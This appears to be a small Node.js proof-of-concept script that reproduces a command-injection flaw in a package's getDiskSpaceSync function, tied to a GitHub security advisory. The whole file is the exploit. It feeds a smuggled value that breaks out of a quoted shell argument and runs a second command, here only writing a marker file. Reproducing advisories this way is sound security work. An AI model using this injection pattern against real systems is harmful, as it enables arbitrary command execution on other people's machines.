// exploit.js
"use strict";

// Assume the vulnerable function is exported from 'vulnerableModule.js'
const { getDiskSpaceSync } = require('../../packages/GHSA-5f4x-hwv2-w9w2/package/src/util-os');

// This malicious string is designed to break out of the quoted parameter and inject an extra command.
// It works by closing the initial double quote, appending the command to echo "hacked" into a file, then commenting out any extra characters.
const maliciousPath = '"; echo hacked > exploit.txt; #';

try {
  // Calling the vulnerable function with the malicious payload.
  // The injected command is executed, and if the system permits it, an "exploit.txt" file will be created in the current directory.
  getDiskSpaceSync(maliciousPath);
  console.log('Exploit attempted. Check the current directory for exploit.txt.');
} catch (err) {
  console.error('Error occurred (this may happen if the injected command impacts the normal command flow):', err);
}

